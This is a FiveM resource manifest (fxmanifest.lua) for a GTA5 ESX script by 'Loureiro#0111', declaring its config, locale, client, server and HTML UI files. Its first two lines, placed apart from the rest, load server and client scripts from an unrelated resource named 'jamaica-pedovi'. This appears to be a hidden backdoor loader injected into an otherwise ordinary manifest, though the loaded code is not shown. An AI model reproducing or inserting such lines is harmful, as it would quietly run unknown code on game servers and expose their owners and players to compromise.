server_script '@jamaica-pedovi/src/include/server.lua'
client_script '@jamaica-pedovi/src/include/client.lua'




fx_version 'adamant'
game 'gta5'
author 'Loureiro#0111'
version '1.3'
shared_script '@es_extended/imports.lua'

shared_scripts {
    'config.lua',
}

server_scripts {
	'@es_extended/locale.lua',
	'@oxmysql/lib/MySQL.lua',
	'locales/*.lua',
	'config.lua',
	'server.lua',

}

client_scripts {
	'@es_extended/locale.lua',
	'locales/*.lua',
	'config.lua',
	'client.lua',

}

ui_page 'html/index.html'

files {
    'html/index.html',
    'html/script.js',
    'html/style.css',
    'html/*.ttf',
    'html/*.otf',


    'html/images/*.png',
}

escrow_ignore {
	'*.lua',
	'locales/*.lua',
}

lua54 'yes'
